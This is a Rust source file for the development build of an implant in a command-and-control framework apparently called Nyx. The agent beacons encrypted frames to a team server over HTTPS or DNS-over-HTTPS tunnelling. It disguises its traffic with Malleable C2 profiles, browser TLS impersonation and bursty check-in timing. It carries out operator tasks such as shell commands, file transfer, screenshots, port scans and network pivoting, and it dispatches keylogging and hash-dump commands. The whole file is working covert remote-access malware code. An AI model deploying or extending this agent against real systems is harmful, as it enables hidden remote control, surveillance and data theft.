//! Std-based dev implant. This is NOT the Windows PIC agent — it exists to
//! exercise the full encrypted beacon loop on the development host (macOS/Linux/Windows)
//! so the protocol + server can be validated end-to-end before the PIC port.
//!
//! Loop:  check-in (SessionInfo)  ->  every `sleep_seconds`: send last cycle's
//! task responses, receive this cycle's tasks, execute them.

use std::path::{Path, PathBuf};
use std::time::Duration;

use nyx_profile::{ServerEnvelope, TimingBaseline};
use nyx_protocol::{
    encode_frame_dir, open_frame_dir, parse_frame, wire::Writer, Command, Direction, FileOp,
    ImplantKeypair, Response, SessionInfo, SessionKey, Task, TaskResponse,
};
use nyx_transport::traits::Transport as _;

pub mod pivot;

pub struct Config {
    /// e.g. `http://127.0.0.1:8443`
    pub server_url: String,
    pub server_pub: [u8; 32],
    pub sleep_seconds: u32,
    pub jitter_pct: u8,
    /// Root directory for `Upload` (writes) and `Download` (reads). Remote paths
    /// are resolved relative to this and confined within it (no absolute paths,
    /// no `..` traversal) so the dev agent can't escape its sandbox.
    pub work_dir: PathBuf,
    /// Beacon endpoint path — `/beacon`, or the Malleable C2 profile's http-post
    /// `uri`. The agent POSTs the encrypted frame to `{server_url}{beacon_uri}`.
    pub beacon_uri: String,
    /// Optional Malleable C2 profile. When set, the agent applies the profile's
    /// `http-post client` envelope on each send (transform steps, static
    /// headers, useragent) AND inverts the `server.output` envelope on each
    /// response — the same two-sided shaping the PIC implant applies.
    pub profile: Option<nyx_profile::Profile>,
    /// Beacon channel: HTTPS (default) or DoH DNS tunnelling (spec-2) via the
    /// transport crate's `DohDnsTransport`, driven against the team server's
    /// authoritative DNS responder (`/dns-query`).
    pub channel: BeaconChannelKind,
    /// DoH server URL (e.g. `http://127.0.0.1:8443/dns-query`) — used when
    /// `channel == Doh`.
    pub doh_server: String,
    /// DoH zone domain (must match the server's `NYX_DOH_DOMAIN`) — used when
    /// `channel == Doh`.
    pub doh_domain: String,
    /// Browser TLS impersonation profile for the HTTPS channel (requires the
    /// `impersonation` feature; `None` = plain ureq client). With a profile
    /// set, the beacon's ClientHello/HTTP2 frames match the real browser.
    pub impersonate: Option<nyx_transport::fingerprint::BrowserProfile>,
}

/// Which beacon channel the dev agent uses.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BeaconChannelKind {
    /// Direct HTTPS POST to the team server (default).
    Https,
    /// DoH DNS tunnelling: frame chunks as TXT queries, replies polled from
    /// `task.{domain}` (spec-2). Low-bandwidth by design.
    Doh,
}

/// One beacon link. Owns the HTTP agent (or DoH transport) plus the profile
/// envelopes, so shaping state survives across cycles.
enum BeaconLink {
    Https {
        url: String,
        agent: ureq::Agent,
        client_env: nyx_profile::ClientEnvelope,
        server_env: ServerEnvelope,
        /// BoringSSL-backed impersonating client (feature-gated; `None` on a
        /// build without the `impersonation` feature or without a profile).
        #[cfg(feature = "impersonation")]
        impersonator: Option<nyx_transport::fingerprint::ImpersonatingClient>,
        /// Current-thread Tokio runtime driving the wreq client (wreq's
        /// connect layer requires a live reactor).
        #[cfg(feature = "impersonation")]
        rt: tokio::runtime::Runtime,
    },
    Doh(nyx_transport::doh_dns::DohDnsTransport),
}

impl BeaconLink {
    /// Build the link for `cfg`.
    fn new(cfg: &Config) -> anyhow::Result<Self> {
        let client_env = cfg
            .profile
            .as_ref()
            .map(nyx_profile::post_client_envelope)
            .unwrap_or_default();
        let server_env = cfg
            .profile
            .as_ref()
            .map(nyx_profile::post_server_envelope)
            .unwrap_or_default();
        match cfg.channel {
            BeaconChannelKind::Https => {
                #[cfg(feature = "impersonation")]
                let impersonator = match cfg.impersonate {
                    Some(profile) => {
                        match nyx_transport::fingerprint::build_impersonating_client(profile) {
                            Ok(c) => {
                                tracing::info!(
                                    profile = %profile.family(),
                                    "beacon HTTPS client impersonating browser TLS"
                                );
                                Some(c)
                            }
                            Err(e) => {
                                tracing::warn!(
                                    error = %e,
                                    "impersonating client build failed; falling back to plain ureq"
                                );
                                None
                            }
                        }
                    }
                    None => None,
                };
                Ok(BeaconLink::Https {
                    url: format!("{}{}", cfg.server_url, cfg.beacon_uri),
                    agent: ureq::AgentBuilder::new()
                        .timeout(Duration::from_secs(30))
                        .build(),
                    client_env,
                    server_env,
                    #[cfg(feature = "impersonation")]
                    impersonator,
                    #[cfg(feature = "impersonation")]
                    rt: tokio::runtime::Builder::new_current_thread()
                        .enable_all()
                        .build()
                        .map_err(|e| anyhow::anyhow!("tokio runtime build failed: {e}"))?,
                })
            }
            BeaconChannelKind::Doh => {
                if cfg.doh_server.is_empty() || cfg.doh_domain.is_empty() {
                    anyhow::bail!(
                        "Doh channel requires doh_server (NYX_DOH_SERVER) and \
                         doh_domain (NYX_DOH_DOMAIN)"
                    );
                }
                let t = nyx_transport::doh_dns::DohDnsTransport::new(
                    cfg.doh_domain.clone(),
                    Some(&cfg.doh_server),
                );
                Ok(BeaconLink::Doh(t))
            }
        }
    }

    /// Full round-trip: deliver `frame`, return the raw reply frame bytes
    /// (server envelope already inverted on the HTTPS path; DNS carries no
    /// envelope). Blocks up to the channel's own timeout.
    fn exchange(&mut self, frame: &[u8]) -> Result<Vec<u8>, String> {
        match self {
            BeaconLink::Https {
                url,
                agent,
                client_env,
                server_env,
                #[cfg(feature = "impersonation")]
                impersonator,
                #[cfg(feature = "impersonation")]
                rt,
            } => {
                // Client envelope: transform steps + terminator + headers + UA
                // (mirror of implant-win/src/transport.rs). Compute the shaped
                // body + headers once, then pick the transport (plain ureq or
                // the impersonating BoringSSL client).
                let (mut body, extra) = client_env.shape_body(frame);
                let mut headers: Vec<(String, String)> = Vec::new();
                if let Some(ua) = &client_env.useragent {
                    if let Ok(ua) = std::str::from_utf8(ua) {
                        headers.push(("User-Agent".to_string(), ua.to_string()));
                    }
                }
                for (n, v) in &client_env.headers {
                    let (Ok(n), Ok(v)) = (std::str::from_utf8(n), std::str::from_utf8(v)) else {
                        continue;
                    };
                    headers.push((n.to_string(), v.to_string()));
                }
                if let Some(nyx_profile::Terminator::Header(name)) = &client_env.terminator {
                    // The whole frame rides in a header; body stays empty.
                    if let (Ok(name), Ok(extra)) = (
                        std::str::from_utf8(name.as_bytes()),
                        std::str::from_utf8(&extra),
                    ) {
                        headers.push((name.to_string(), extra.to_string()));
                    }
                    body.clear();
                }
                // Other terminators (print/uri-append/parameter) keep the bytes
                // in the body — the server's beacon handler inverts whichever
                // the profile declares.

                #[cfg(feature = "impersonation")]
                if let Some(client) = impersonator {
                    let resp = rt
                        .block_on(async {
                            let mut req = client.post(url.as_str());
                            for (n, v) in &headers {
                                req = req.header(n.as_str(), v.as_str());
                            }
                            req.header("Content-Type", "application/octet-stream")
                                .body(wreq::Body::from(body.clone()))
                                .send()
                                .await
                        })
                        .map_err(|e| format!("impersonating beacon POST failed: {e}"))?;
                    if !resp.status().is_success() {
                        return Err(format!(
                            "impersonating beacon POST returned {}",
                            resp.status()
                        ));
                    }
                    let bytes = rt
                        .block_on(resp.bytes())
                        .map_err(|e| format!("impersonating beacon response read failed: {e}"))?;
                    return Ok(unwrap_server_envelope(server_env, &bytes));
                }

                let mut req = agent.post(url);
                for (n, v) in &headers {
                    req = req.set(n, v);
                }
                let resp = req
                    .send_bytes(&body)
                    .map_err(|e| format!("beacon POST failed: {e}"))?;
                let mut raw = Vec::new();
                std::io::Read::read_to_end(&mut resp.into_reader(), &mut raw)
                    .map_err(|e| format!("beacon response read failed: {e}"))?;
                Ok(unwrap_server_envelope(server_env, &raw))
            }
            BeaconLink::Doh(t) => {
                t.send(frame).map_err(|e| format!("doh send failed: {e}"))?;
                // Reply arrives as TXT at task.{domain} within the window.
                t.recv(15_000).map_err(|e| format!("doh recv failed: {e}"))
            }
        }
    }

    /// Mid-cycle flush delivery. NOT fire-and-forget: the server packs
    /// newly-queued tasks into EVERY beacon reply (including mid-flush ones),
    /// so the caller MUST consume the returned reply frame — dropping it
    /// silently loses tasks that were already dequeued server-side (BUG-1).
    fn post(&mut self, frame: &[u8]) -> Result<Vec<u8>, String> {
        self.exchange(frame)
    }
}

/// Decode the task batch riding a mid-flush reply frame. `None` when the
/// reply carries no usable frame (empty body, AEAD failure, undecodable
/// batch) — a mid-flush reply with zero tasks is routine and must never
/// abort the beacon loop (same decode discipline as the main cycle).
fn open_reply_tasks(key: &SessionKey, frame_bytes: &[u8]) -> Option<Vec<Task>> {
    let raw = parse_frame(frame_bytes).ok()?;
    // Server replies travel in the ServerToClient nonce space (see protocol
    // Direction); open them with the matching direction or the AEAD tag fails.
    let plaintext = open_frame_dir(key, Direction::ServerToClient, &raw).ok()?;
    Task::decode_vec(&plaintext).ok()
}

/// Queue any tasks packed into a mid-flush reply behind the current batch
/// (BUG-1). The server dequeues pending tasks into every beacon reply; the
/// old fire-and-forget `post` dropped those replies, so tasks queued while a
/// large streamed result (screenshot/download) was mid-flush vanished
/// server-side without ever executing. Deferred tasks run after the current
/// batch, ahead of the next cycle's fetch (FIFO vs the server queue).
fn defer_reply_tasks(key: &SessionKey, reply: &[u8], deferred: &mut Vec<Task>) {
    match open_reply_tasks(key, reply) {
        Some(mut tasks) if !tasks.is_empty() => {
            tracing::info!(
                count = tasks.len(),
                "mid-flush reply carried tasks; deferred behind current batch"
            );
            deferred.append(&mut tasks);
        }
        _ => {}
    }
}

pub fn run(cfg: Config) -> anyhow::Result<()> {
    let kp = ImplantKeypair::generate()
        .map_err(|_| anyhow::anyhow!("CSPRNG failure during implant keypair generation"))?;
    let pubkey = kp.public_bytes();
    let key = kp.session_key(&cfg.server_pub).unwrap_or_else(|e| {
        // Fatal config error: a non-contributory server pubkey (low-order
        // point, e.g. all-zero) can never yield a session key. Use a distinct
        // exit code so the operator can tell key-exchange failure apart from a
        // generic error without reading logs.
        tracing::error!(
            error = %e,
            "fatal config error: server pubkey rejected by X25519 (low-order point); \
             fix NYX_SERVER_PUB"
        );
        std::process::exit(0xB1);
    });
    let beacon_id: u32 = rand::random();

    let info = SessionInfo {
        beacon_id,
        hostname: hostname(),
        username: username(),
        os: os_string(),
        arch: arch_code(),
        pid: std::process::id(),
        is_admin: is_admin(),
        auth_token: None, // dev agent has no per-implant token
    };

    // Beacon link: HTTPS with full profile shaping, or DoH DNS tunnelling.
    let mut link = BeaconLink::new(&cfg)?;

    // ---- check-in (retry until the server accepts us) ----------------------
    let mut counter = 0u64;
    let mut w = Writer::new();
    info.encode(&mut w)?;
    let info_plain = w.into_bytes();
    loop {
        let frame = encode_frame_dir(
            &pubkey,
            Direction::ClientToServer,
            counter,
            &key,
            &info_plain,
        )
        .map_err(|e| anyhow::anyhow!("failed to seal check-in frame: {e}"))?;
        counter += 1;
        match link.exchange(&frame) {
            Ok(_) => break,
            Err(e) => {
                tracing::warn!(error = %e, "check-in failed; retrying");
                std::thread::sleep(Duration::from_secs(2));
            }
        }
    }
    tracing::info!(beacon_id, "check-in accepted");

    // ---- beacon loop -------------------------------------------------------
    // `set timing_baseline` from the profile: `uniform` (default) is the
    // classic sleep±jitter cadence; `bursty` paces check-ins as short-interval
    // bursts separated by long sleeps, blurring the connection cadence.
    let timing = cfg
        .profile
        .as_ref()
        .map(|p| p.timing_baseline())
        .unwrap_or_default();
    let mut cycle: u32 = 0;
    let mut pending_responses: Vec<TaskResponse> = Vec::new();
    // Tasks unpacked from mid-flush reply frames (BUG-1). They were dequeued
    // server-side before anything this cycle's reply carries, so they run
    // first (FIFO vs the server queue).
    let mut deferred_tasks: Vec<Task> = Vec::new();
    loop {
        let mut sleep_for = jitter_sleep(cfg.sleep_seconds, cfg.jitter_pct);
        if timing == TimingBaseline::Bursty {
            sleep_for = bursty_sleep(cycle, sleep_for);
        }
        cycle = cycle.wrapping_add(1);
        std::thread::sleep(sleep_for);

        // Drain relay sockets (Connect/Socks channels) into the pending batch
        // before the POST — mirrors the PIC beacon's per-cycle pump
        // (implant-win/src/beacon.rs beacon_cycle_setup). Channel responses
        // ride the next frame with task_id 0.
        for r in crate::pivot::pump_channels() {
            pending_responses.push(TaskResponse {
                task_id: 0,
                response: r,
            });
        }
        // Retention bound: while the server is unreachable the pump above (and
        // any failed task-result flushes) would grow the cache without limit.
        // Drop the oldest responses past PENDING_CAP and log it — never panic,
        // never grow unbounded (mirrors the implant's keep-and-retry
        // discipline, with a hard ceiling on top).
        let dropped = cap_pending(&mut pending_responses, PENDING_CAP);
        if dropped > 0 {
            tracing::warn!(
                dropped,
                "pending response cache over PENDING_CAP; dropped oldest responses"
            );
        }

        // `encode_batch` never fails: an oversized response blob is replaced
        // with a `Response::Err` so the batch still encodes (mirrors the PIC
        // beacon's encode_batch — a bad blob must not abort the loop).
        // Frame split: the cache may hold far more than one frame after a
        // server outage, so seal only the leading prefix that fits under
        // MAX_CT_LEN — sealing the whole batch used to propagate
        // PlaintextTooLarge as a FATAL error. A seal failure here (estimate
        // drift) is likewise non-fatal: keep the batch and retry next cycle.
        let prefix = frame_prefix_len(&pending_responses, PACK_BUDGET);
        let frame = match encode_frame_dir(
            &pubkey,
            Direction::ClientToServer,
            counter,
            &key,
            &encode_batch(&mut pending_responses[..prefix]),
        ) {
            Ok(f) => f,
            Err(e) => {
                tracing::warn!(error = %e, "failed to seal beacon frame; batch retained for retry");
                continue;
            }
        };

        // Counter/pending discipline (P0-3): advance the counter and drain the
        // sent prefix ONLY after the POST actually succeeded, so a failed
        // round-trip neither desyncs the sequence number nor drops undelivered
        // responses (they ride the next frame at the same counter). Mirrors
        // the mid-cycle flush paths below.
        let frame_bytes = match link.exchange(&frame) {
            Ok(b) => {
                counter += 1;
                pending_responses.drain(..prefix);
                b
            }
            Err(e) => {
                tracing::warn!(error = %e, "beacon exchange failed");
                continue;
            }
        };

        let raw = match parse_frame(&frame_bytes) {
            Ok(r) => r,
            Err(e) => {
                tracing::warn!(?e, "bad reply frame");
                continue;
            }
        };
        // Server replies travel in the ServerToClient nonce space (see protocol
        // Direction); open them with the matching direction or the AEAD tag fails.
        let plaintext = match open_frame_dir(&key, Direction::ServerToClient, &raw) {
            Ok(p) => p,
            Err(_) => {
                tracing::warn!("server reply decryption failed");
                continue;
            }
        };
        // A malformed/unparseable server reply must not kill the beacon loop:
        // skip the cycle and try again on the next sleep (mirrors the PIC
        // beacon's `beacon_dispatch_tasks` — decode failures are transient or
        // malicious, never fatal for the agent).
        let Ok(fetched) = Task::decode_vec(&plaintext) else {
            tracing::warn!("task batch decode failed; skipping cycle");
            continue;
        };
        let mut tasks = std::mem::take(&mut deferred_tasks);
        tasks.extend(fetched);

        for t in tasks {
            if matches!(t.command, Command::Exit) {
                tracing::info!("Exit task received; shutting down");
                // Final flush: earlier tasks in this same batch may already
                // have produced responses (download chunks, shell output) that
                // the top-of-loop send has not carried yet. Best-effort POST
                // them before exiting — otherwise they are silently lost with
                // the loop teardown. Counter advances only on success (same
                // P0-3 discipline as the main loop).
                if !pending_responses.is_empty() {
                    let prefix = frame_prefix_len(&pending_responses, PACK_BUDGET);
                    let frame = match encode_frame_dir(
                        &pubkey,
                        Direction::ClientToServer,
                        counter,
                        &key,
                        &encode_batch(&mut pending_responses[..prefix]),
                    ) {
                        Ok(f) => f,
                        Err(e) => {
                            // Best-effort flush: a seal failure must not turn a
                            // deliberate Exit into a fatal error.
                            tracing::warn!(
                                error = %e,
                                "failed to seal final flush frame; exiting anyway"
                            );
                            return Ok(());
                        }
                    };
                    match link.post(&frame) {
                        // Loop exits immediately after this flush, so the
                        // counter is not advanced (dead store otherwise).
                        Ok(_) => {}
                        Err(e) => tracing::warn!(
                            error = %e,
                            "final flush on exit failed; responses not delivered"
                        ),
                    }
                }
                return Ok(());
            }
            // A task may yield multiple responses (e.g. a streamed Download or
            // Screenshot -> many FileChunks). We batch them but flush early if
            // the accumulated batch would exceed the frame size limit (~200KB
            // safe margin under MAX_CT_LEN's 512 KiB cap).
            const BATCH_FLUSH: usize = 200 * 1024;
            for response in execute(t.command, &cfg.work_dir) {
                // 估算单条 response 的编码大小（粗略：blob 数据就是其主要体积）
                let estimated_size = match &response {
                    Response::FileChunk { data, .. } => data.len(),
                    Response::Output(d) | Response::BofOutput(d) | Response::Image(d) => d.len(),
                    _ => 0,
                };
                // 如果加这条会超限，先 flush 当前批次
                if estimated_size > BATCH_FLUSH {
                    // 单条本身就很大（不应发生——分块应该保证每条 <128KB）
                    // 直接发这条独占一个帧（encode_batch 会把超限 blob 换成
                    // Err，编码本身不会失败）。封帧失败不允许致命退出：警告
                    // 并丢弃这一条（它独占一帧都放不下，永远发不出去）。
                    let mut single = vec![TaskResponse {
                        task_id: t.task_id,
                        response,
                    }];
                    match encode_frame_dir(
                        &pubkey,
                        Direction::ClientToServer,
                        counter,
                        &key,
                        &encode_batch(&mut single),
                    ) {
                        Ok(frame) => {
                            // 只有 POST 成功才推进 counter（失败不推进：下一帧仍用同一
                            // counter，服务端从未见过这一帧）。成功时回复里可能携带
                            // 新任务（BUG-1），必须解码入队，不能丢弃。
                            match link.post(&frame) {
                                Ok(reply) => {
                                    counter += 1;
                                    defer_reply_tasks(&key, &reply, &mut deferred_tasks);
                                }
                                Err(e) => {
                                    tracing::warn!(error = %e, "beacon send failed (oversized chunk); response dropped");
                                }
                            }
                        }
                        Err(e) => {
                            tracing::warn!(error = %e, "failed to seal oversized-chunk frame; response dropped");
                        }
                    }
                    continue;
                }
                let current_batch_size: usize = pending_responses
                    .iter()
                    .map(|tr| match &tr.response {
                        Response::FileChunk { data, .. } => data.len(),
                        Response::Output(d) | Response::BofOutput(d) | Response::Image(d) => {
                            d.len()
                        }
                        _ => 0,
                    })
                    .sum();
                if current_batch_size + estimated_size > BATCH_FLUSH
                    && !pending_responses.is_empty()
                {
                    // Flush 当前批次。encode_batch 保证编码不失败；只有 POST
                    // 成功才推进 counter 并清空已发前缀——失败的批次留在 pending
                    // 里，随下一帧（同一 counter）重发：不丢响应、不对齐失步。
                    // pending 可能因之前的失败累积到远超一帧（server 不可达），
                    // 只封能放进一帧的前缀；封帧失败同样只警告保留，不致命。
                    let prefix = frame_prefix_len(&pending_responses, PACK_BUDGET);
                    match encode_frame_dir(
                        &pubkey,
                        Direction::ClientToServer,
                        counter,
                        &key,
                        &encode_batch(&mut pending_responses[..prefix]),
                    ) {
                        Ok(frame) => match link.post(&frame) {
                            Ok(reply) => {
                                counter += 1;
                                pending_responses.drain(..prefix);
                                // BUG-1: 服务端把新入队的任务打包进每一个 beacon
                                // 回复（包括 mid-flush）。解码并延后执行；丢弃回复
                                // 会丢掉服务端已出队的任务。
                                defer_reply_tasks(&key, &reply, &mut deferred_tasks);
                            }
                            Err(e) => {
                                tracing::warn!(error = %e, "beacon send failed (batch flush); response batch retained for retry");
                            }
                        },
                        Err(e) => {
                            tracing::warn!(error = %e, "failed to seal batch-flush frame; batch retained for retry");
                        }
                    }
                }
                pending_responses.push(TaskResponse {
                    task_id: t.task_id,
                    response,
                });
                // 保留上限：flush 反复失败（server 不可达）时大型流式结果会
                // 无界堆积——丢最旧、记日志，绝不允许撑爆内存或超帧致命退出。
                let dropped = cap_pending(&mut pending_responses, PENDING_CAP);
                if dropped > 0 {
                    tracing::warn!(
                        dropped,
                        "pending response cache over PENDING_CAP; dropped oldest responses"
                    );
                }
            }
        }
    }
}

/// 单帧明文打包预算。`encode_frame_dir` 在 `plaintext + TAG_LEN > MAX_CT_LEN`
/// 时拒绝封帧——server 不可达期间 pending 缓存会跨 cycle 累积，整批封帧
/// 一旦超 512 KiB 旧代码就把错误传播成致命退出。打包时只取估算后能放进
/// 一帧的前缀，其余留到下一帧；1 KiB 余量覆盖 `encode_vec` 的逐条
/// varint/tag/name 开销与 Vec 长度前缀（`response_wire_size` 已按 24 字节
/// 高估逐条开销，这里的余量是双保险）。
const PACK_BUDGET: usize = nyx_protocol::frame::MAX_CT_LEN - nyx_protocol::TAG_LEN - 1024;

/// pending 缓存的保留上限（估算字节）。server 长时间不可达时 channel pump
/// 与任务结果会无限累积；超过上限丢弃最旧的响应并记日志（保最新），绝不
/// 允许无界增长。4 MiB 与 `SHELL_OUTPUT_CAP` 同级，远超一帧的交付能力。
const PENDING_CAP: usize = 4 * 1024 * 1024;

/// 估算单条 [`TaskResponse`] 编码后的体积：blob/文本主体 + 逐条 varint、
/// tag、name、seq/eof 开销（`OVERHEAD` 故意高估）。只用于打包/保留决策，
/// 不要求精确。
fn response_wire_size(tr: &TaskResponse) -> usize {
    const OVERHEAD: usize = 24;
    match &tr.response {
        Response::FileChunk { name, data, .. } => data.len() + name.len() + OVERHEAD,
        Response::Output(d) | Response::BofOutput(d) | Response::Image(d) => d.len() + OVERHEAD,
        Response::Channel { data, .. } => data.len() + OVERHEAD,
        Response::Ok => OVERHEAD,
        Response::Err(m) => m.len() + OVERHEAD,
    }
}

/// pending 前缀中估算能在 `budget` 内编码的条数，空批次返回 0，非空至少
/// 返回 1（单条超限 blob 会被 `encode_batch` 换成有界 `Response::Err`，
/// 独占一帧总能放下）。调用方按 `pending[..n]` 封帧、仅发送成功后
/// `drain(..n)`，从而 server 不可达期间累积的超大缓存按帧切分发送，
/// 绝不触发 `MAX_CT_LEN` 致命退出。
fn frame_prefix_len(pending: &[TaskResponse], budget: usize) -> usize {
    if pending.is_empty() {
        return 0;
    }
    let mut used = 8; // encode_vec 的 Vec 长度前缀
    let mut n = 0;
    for tr in pending {
        let size = response_wire_size(tr);
        if n > 0 && used + size > budget {
            break;
        }
        used += size;
        n += 1;
    }
    n.max(1)
}

/// pending 总量超 `cap`（估算字节）时丢弃最旧的响应（保最新），返回丢弃
/// 条数，调用方负责记日志。
fn cap_pending(pending: &mut Vec<TaskResponse>, cap: usize) -> usize {
    let mut total: usize = pending.iter().map(response_wire_size).sum();
    let mut dropped = 0;
    while total > cap && dropped < pending.len() {
        total -= response_wire_size(&pending[dropped]);
        dropped += 1;
    }
    if dropped > 0 {
        pending.drain(..dropped);
    }
    dropped
}

/// Encode a batch of [`TaskResponse`]s for the wire, gracefully handling an
/// oversized payload. `TaskResponse::encode_vec` only fails when a blob
/// exceeds `wire::MAX_BLOB_LEN` (256 KiB) — in practice a screenshot or large
/// BOF output. Since the dev agent mirrors the PIC beacon (`panic = "abort"`
/// discipline), letting that propagate would abort the loop; instead we
/// replace each oversized [`Response`] with a tiny `Response::Err` and retry.
/// The operator sees what was dropped instead of the agent dying.
/// `Response::Err` messages are themselves bounded well under `MAX_BLOB_LEN`,
/// so the retry always succeeds. Ported from the implant beacon's
/// `encode_batch` (crates/implant-win/src/beacon.rs).
fn encode_batch(pending: &mut [TaskResponse]) -> Vec<u8> {
    if let Ok(v) = TaskResponse::encode_vec(pending) {
        return v;
    }
    // One or more responses carried a blob > MAX_BLOB_LEN. Replace each
    // oversized payload with an Err so the batch encodes (and the operator is
    // told what was dropped rather than the beacon aborting).
    for tr in pending.iter_mut() {
        let too_big = match &tr.response {
            Response::FileChunk { data, .. }
            | Response::Output(data)
            | Response::BofOutput(data)
            | Response::Image(data)
            | Response::Channel { data, .. } => data.len() > nyx_protocol::wire::MAX_BLOB_LEN,
            Response::Ok | Response::Err(_) => false,
        };
        if too_big {
            tr.response = Response::Err(String::from(
                "response too large: payload exceeds MAX_BLOB_LEN",
            ));
        }
    }
    TaskResponse::encode_vec(pending).unwrap_or_default()
}

/// Recover the raw encrypted frame from a server response body. With no
/// envelope (or a `print` terminator with no transform steps) the body *is* the
/// frame. Otherwise strip the traffic-shaping padding (appended after the
/// transform chain, self-delimiting) and invert the transform chain. For a
/// `header`/`parameter` terminator the transformed bytes ride in a header, not
/// the body — the dev agent doesn't speak that variant (the PIC implant will),
/// so this returns the body unchanged and the frame parse will fail loudly,
/// surfacing the mismatch.
fn unwrap_server_envelope(env: &ServerEnvelope, body: &[u8]) -> Vec<u8> {
    // Padding comes off BEFORE decode (it rides after the transform chain);
    // on failure keep the raw bytes — same loud-parse discipline as below.
    let body = match env.strip_padding(body) {
        Ok(b) => b,
        Err(e) => {
            tracing::warn!(?e, "server envelope padding strip failed; trying raw frame");
            body
        }
    };
    if env.steps.is_empty() {
        return body.to_vec();
    }
    match nyx_profile::decode(&env.steps, body) {
        Ok(raw) => raw,
        Err(e) => {
            tracing::warn!(?e, "server envelope decode failed; trying raw frame");
            body.to_vec()
        }
    }
}

/// Execute a command, returning zero or more responses. A `Download` streams
/// multiple `FileChunk`s; everything else yields one response. The beacon loop
/// tags each returned response with the originating task id.
fn execute(cmd: Command, work_dir: &Path) -> Vec<Response> {
    match cmd {
        Command::Ping => vec![Response::Ok],
        Command::Shell { args } => vec![run_shell(&args)],
        // The dev agent ignores dynamic sleep re-tasking (interval is fixed at start).
        Command::Sleep { .. } => vec![Response::Ok],
        Command::Upload { name, data } => vec![do_upload(work_dir, &name, &data)],
        Command::Download { path } => do_download(work_dir, &path),
        Command::FileOp { op, path, dest } => vec![do_fileop(op, work_dir, &path, dest.as_deref())],
        // P2/P3 executors (BOF, P2P connect, SOCKS) are implant-side; the dev
        // agent acks them as unimplemented so the wire types stay round-trippable.
        Command::Bof { blob, args, .. } => vec![bof_execute(&blob, &args)],
        Command::Screenshot { monitor } => do_screenshot(monitor),
        Command::Portscan { host, ports } => vec![do_portscan(&host, &ports)],
        Command::Net { query } => vec![do_net(&query)],
        Command::DriveInfo => vec![do_driveinfo()],
        Command::Clipboard => vec![do_clipboard()],
        Command::Env { name } => vec![do_env(&name)],
        Command::Keylog { action } => vec![do_keylog(action)],
        Command::Screenwatch { interval_secs } => do_screenwatch(interval_secs),
        Command::Hashdump { method } => vec![do_hashdump(method)],
        // P2P / relay channels. The dev agent opens the socket and reports
        // channel status back so the operator sees the Connect actually
        // succeed or fail end-to-end (and the TUI topology graph gets a real
        // Open edge to draw). Full bidirectional relay is deferred — the dev
        // beacon loop is synchronous-poll (sleep → fetch → execute → post),
        // so a long-lived forwarding task doesn't fit it without the
        // persistent-task refactor flagged in the design doc. Socks likewise
        // acknowledges the opcode without a full SOCKS5 state machine.
        Command::Connect {
            proto,
            host,
            port,
            chan,
        } => {
            vec![crate::pivot::do_connect(proto, &host, port, chan)]
        }
        Command::Socks {
            chan,
            op,
            addr,
            port,
        } => {
            vec![crate::pivot::do_socks(chan, op, &addr, port)]
        }
        // Relay data/close: the dev agent keeps a real channel table now
        // (see pivot.rs — the std port of the implant's relay), so channel
        // data flows operator → server → agent → socket and back via
        // `pump_channels` each cycle.
        Command::ChannelData { chan, data } => vec![crate::pivot::channel_data(chan, &data)],
        Command::ChannelClose { chan } => vec![crate::pivot::channel_close(chan)],
        // Token ops are Windows-implant primitives. The dev agent can't steal/
        // make a Windows token on macOS/Linux, so those ack as implant-side;
        // GetUid runs `whoami` so the loop is verifiable end-to-end.
        Command::StealToken { pid } => vec![Response::Err(format!(
            "dev agent: steal_token({pid}) is a Windows implant primitive"
        ))],
        Command::MakeToken { domain, user, .. } => vec![Response::Err(format!(
            "dev agent: make_token({domain}\\{user}) is a Windows implant primitive"
        ))],
        Command::Rev2Self => vec![Response::Err(
            "dev agent: rev2self is a Windows implant primitive".into(),
        )],
        Command::GetUid => match std::process::Command::new("whoami").output() {
            Ok(o) => vec![Response::Output(o.stdout)],
            Err(e) => vec![Response::Err(format!("whoami failed: {e}"))],
        },
        Command::Inject { .. } => vec![Response::Err(
            "dev agent: inject is a Windows implant primitive".into(),
        )],
        Command::Trex => vec![Response::Err(
            "dev agent: trex is a Windows implant primitive".into(),
        )],
        Command::SetChannel { .. } => vec![Response::Err(
            "dev agent: setchannel is a Windows implant primitive".into(),
        )],
        Command::Exit => vec![Response::Ok],
    }
}

/// 截屏。macOS 用 screencapture，Linux 用 scrot/import。
/// PNG 可能很大（1MB+），用 FileChunk 分块流回（和 download 一样）。
fn do_screenshot(monitor: u8) -> Vec<Response> {
    #[cfg(not(unix))]
    {
        let _ = monitor;
        vec![Response::Err("screenshot: not supported on this OS".into())]
    }
    #[cfg(unix)]
    {
        let tmp = format!("/tmp/nyx_shot_{}.png", std::process::id());
        #[cfg(target_os = "macos")]
        let prog = "screencapture";
        #[cfg(all(unix, not(target_os = "macos")))]
        let prog = "scrot";
        let _ = monitor;
        let result = std::process::Command::new(prog)
            .arg("-x")
            .arg(&tmp)
            .output();
        let png = match result {
            Ok(out) if out.status.success() => match std::fs::read(&tmp) {
                Ok(data) => {
                    let _ = std::fs::remove_file(&tmp);
                    data
                }
                Err(e) => return vec![Response::Err(format!("screenshot: read {e}"))],
            },
            Ok(out) => {
                return vec![Response::Err(format!(
                    "screenshot: {} failed: {}",
                    prog,
                    String::from_utf8_lossy(&out.stderr)
                ))]
            }
            Err(e) => return vec![Response::Err(format!("screenshot: {prog} not found: {e}"))],
        };
        // 分块流回（每块 128KB，安全在 MAX_CT_LEN 512 KiB 以内）
        const CHUNK: usize = 128 * 1024;
        let name = "screenshot.png".to_string();
        let mut chunks = Vec::new();
        for (seq, block) in png.chunks(CHUNK).enumerate() {
            let eof = if (seq + 1) * CHUNK >= png.len() { 1 } else { 0 };
            chunks.push(Response::FileChunk {
                name: name.clone(),
                seq: seq as u32,
                eof,
                data: block.to_vec(),
            });
        }
        if chunks.is_empty() {
            chunks.push(Response::FileChunk {
                name,
                seq: 0,
                eof: 1,
                data: Vec::new(),
            });
        }
        chunks
    }
}

/// 端口扫描。用 nc -z 逐个探测，返回 "port open/closed" 列表。
fn do_portscan(host: &str, ports: &str) -> Response {
    let targets = parse_ports(ports);
    if targets.is_empty() {
        return Response::Err("portscan: no valid ports specified".into());
    }
    let mut results = Vec::new();
    for port in targets {
        let open = std::process::Command::new("nc")
            .arg("-z")
            .arg("-w")
            .arg("2")
            .arg(host)
            .arg(port.to_string())
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);
        results.push(format!("{} {}", port, if open { "open" } else { "closed" }));
    }
    Response::Output(results.join("\n").into_bytes())
}

